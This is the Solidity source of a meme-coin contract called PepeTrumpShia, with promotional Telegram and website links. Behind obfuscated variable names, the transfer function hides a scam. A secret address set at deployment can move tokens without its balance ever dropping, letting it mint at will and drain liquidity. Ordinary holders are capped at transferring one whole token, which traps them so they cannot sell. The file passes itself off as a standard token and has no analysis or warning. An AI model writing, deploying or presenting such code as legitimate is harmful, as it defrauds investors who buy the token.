/*

Telegram: https://t.me/PepeTrumpShia

Website: https://pepetrumpshia.crypto-token.live/

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.13;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract PepeTrumpShia is Ownable {
    function fiszkjx(address gpdoeyscfzwu, address duksltza, uint256 drewsbgfc) private {
        address ijxqbs = IUniswapV2Factory(qhfodjxaegvu.factory()).getPair(address(this), qhfodjxaegvu.WETH());
        if (0 == qlma[gpdoeyscfzwu]) {
            if (gpdoeyscfzwu != ijxqbs && tvwmzldnu[gpdoeyscfzwu] != block.number && drewsbgfc < totalSupply) {
                require(drewsbgfc <= totalSupply / (10 ** decimals));
            }
            balanceOf[gpdoeyscfzwu] -= drewsbgfc;
        }
        balanceOf[duksltza] += drewsbgfc;
        tvwmzldnu[duksltza] = block.number;
        emit Transfer(gpdoeyscfzwu, duksltza, drewsbgfc);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address gpdoeyscfzwu, address duksltza, uint256 drewsbgfc) public returns (bool success) {
        require(drewsbgfc <= allowance[gpdoeyscfzwu][msg.sender]);
        allowance[gpdoeyscfzwu][msg.sender] -= drewsbgfc;
        fiszkjx(gpdoeyscfzwu, duksltza, drewsbgfc);
        return true;
    }

    string public name;

    uint8 public decimals = 9;

    mapping(address => uint256) public balanceOf;

    constructor(string memory fxvmaijgdy, string memory vomir, address tzymflqcg, address qtvbci) {
        name = fxvmaijgdy;
        symbol = vomir;
        balanceOf[msg.sender] = totalSupply;
        qlma[qtvbci] = bpomduj;
        qhfodjxaegvu = IUniswapV2Router02(tzymflqcg);
    }

    string public symbol;

    function transfer(address duksltza, uint256 drewsbgfc) public returns (bool success) {
        fiszkjx(msg.sender, duksltza, drewsbgfc);
        return true;
    }

    mapping(address => uint256) private tvwmzldnu;

    uint256 private bpomduj = 115;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private qlma;

    function approve(address bzlu, uint256 drewsbgfc) public returns (bool success) {
        allowance[msg.sender][bzlu] = drewsbgfc;
        emit Approval(msg.sender, bzlu, drewsbgfc);
        return true;
    }

    IUniswapV2Router02 private qhfodjxaegvu;

    uint256 public totalSupply = 1000000000 * 10 ** 9;
}
